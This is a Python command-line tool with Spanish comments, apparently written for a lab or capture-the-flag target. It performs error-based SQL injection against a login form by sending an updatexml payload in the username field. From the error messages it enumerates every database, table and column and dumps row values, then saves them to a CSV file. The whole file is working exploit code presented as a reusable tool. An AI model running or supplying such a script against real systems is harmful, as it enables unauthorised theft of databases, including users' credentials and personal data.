#!/usr/bin/env python3

import requests
import argparse
import csv
from urllib.parse import urlparse

# Argumentos CLI
parser = argparse.ArgumentParser(description="Dump SQL vía SQLi (updatexml), formato estructurado y exportación CSV.")
parser.add_argument("--url", required=True, help="URL del formulario vulnerable, ej: http://10.10.224.12/login")
parser.add_argument("--max", type=int, default=10, help="Máximo de iteraciones por nivel (default: 10)")
args = parser.parse_args()

url = args.url
max_enum = args.max
dump = {}

headers = {
  "User-Agent": "Mozilla/5.0",
  "Content-Type": "application/x-www-form-urlencoded"
}

def sqli_payload(query):
  return f"' AND updatexml(null,concat(0x7e,({query}),0x7e),null) -- -"

def extract(query):
  try:
    r = requests.post(url, data={"username": sqli_payload(query), "password": "x"}, headers=headers, timeout=5)
    if "XPATH syntax error" in r.text:
      start = r.text.find("~")
      end = r.text.find("~", start + 1)
      if start != -1 and end != -1:
        return r.text[start + 1:end]
  except Exception as e:
    print(f"[!] Error durante la petición: {e}")
  return None

print("\n Iniciando dumpeo SQLi con updatexml...\n")

for db_i in range(max_enum):
  db = extract(f"SELECT schema_name FROM information_schema.schemata LIMIT {db_i},1")
  if not db:
    print(f"No hay más bases de datos en offset {db_i}")
    break
  print(f"📁 Base de datos encontrada: {db}")
  dump[db] = {}

  for tb_i in range(max_enum):
    table = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {tb_i},1")
    if not table:
      print(f"   └─ No hay más tablas en {db} (offset {tb_i})")
      break
    print(f"  Tabla: {table}")
    dump[db][table] = {}

    for col_i in range(max_enum):
      column = extract(f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{db}' LIMIT {col_i},1")
      if not column:
        print(f"     └─ No hay más columnas en {db}.{table} (offset {col_i})")
        break
      print(f"    Columna: {column}")
      dump[db][table][column] = []

      for row_i in range(max_enum):
        value = extract(f"SELECT {column} FROM {db}.{table} LIMIT {row_i},1")
        if value is None:
          if row_i == 0:
            print(f"       └─ Sin datos en esta columna.")
          break
        print(f"      row[{row_i}]: {value}")
        dump[db][table][column].append(value)

# Mostrar resumen final
print("\n Resumen final del dumpeo:\n")

for db, tables in dump.items():
  print(f"{db}")
  for table, columns in tables.items():
    print(f"  {table}")
    for column, values in columns.items():
      print(f"    {column}")
      for idx, val in enumerate(values):
        print(f"      row[{idx}]: {val}")

# Guardar en CSV
hostname = urlparse(url).hostname.replace(".", "_")
csv_file = f"dump_{hostname}.csv"
with open(csv_file, "w", newline='', encoding="utf-8") as f:
  writer = csv.writer(f)
  writer.writerow(["Database", "Table", "Column", "RowIndex", "Value"])
  for db, tables in dump.items():
    for table, columns in tables.items():
      for column, values in columns.items():
        for idx, val in enumerate(values):
          writer.writerow([db, table, column, idx, val])

print(f"\n Dump guardado en CSV: {csv_file}")
